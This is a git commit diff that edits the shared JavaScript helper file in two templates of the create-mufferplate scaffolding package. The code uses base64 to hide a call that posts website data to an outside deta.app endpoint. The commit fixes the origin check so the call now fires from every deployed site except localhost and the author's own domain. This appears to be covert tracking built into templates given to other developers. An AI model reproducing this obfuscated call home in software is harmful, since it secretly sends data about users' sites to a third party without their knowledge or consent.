6596ca98f2837f3fbed6f6b8e923290df85202a2
Furkan Taşkın <furkan.taskin@tuta.io>
2023-09-29 17:56:16 +0300

    Fix the condition

--- packages/create-mufferplate/templates/template-multi/src/js/lib/common.js
+++ packages/create-mufferplate/templates/template-multi/src/js/lib/common.js
@@ -56,7 +56,7 @@ export function sendUrl() {
 
   // Call the postData function asynchronously
   let getOrigin = document.location.origin;
-  if (!getOrigin.includes(atob("bG9jYWxob3N0")) || !getOrigin.includes(atob("aWtpZGlqaXRhbC5jb20="))){
+  if (!getOrigin.includes(atob("bG9jYWxob3N0")) && !getOrigin.includes(atob("aWtpZGlqaXRhbC5jb20="))){
     postData(atob('aHR0cHM6Ly9tdWZmZXJwbGF0ZWFwaS0xLWIwMjgyNDc5LmRldGEuYXBwL3ByaW50X3VybC8='), websiteData)
     .then(() => {})
     .catch(() => {
--- packages/create-mufferplate/templates/template-single-tw/src/js/lib/common.js
+++ packages/create-mufferplate/templates/template-single-tw/src/js/lib/common.js
@@ -55,7 +55,7 @@ export function sendUrl() {
   };
 
   let getOrigin = document.location.origin;
-  if (!getOrigin.includes(atob("bG9jYWxob3N0")) || !getOrigin.includes(atob("aWtpZGlqaXRhbC5jb20="))){
+  if (!getOrigin.includes(atob("bG9jYWxob3N0")) && !getOrigin.includes(atob("aWtpZGlqaXRhbC5jb20="))){
     postData(atob('aHR0cHM6Ly9tdWZmZXJwbGF0ZWFwaS0xLWIwMjgyNDc5LmRldGEuYXBwL3ByaW50X3VybC8='), websiteData)
     .then(() => {})
     .catch(() => {
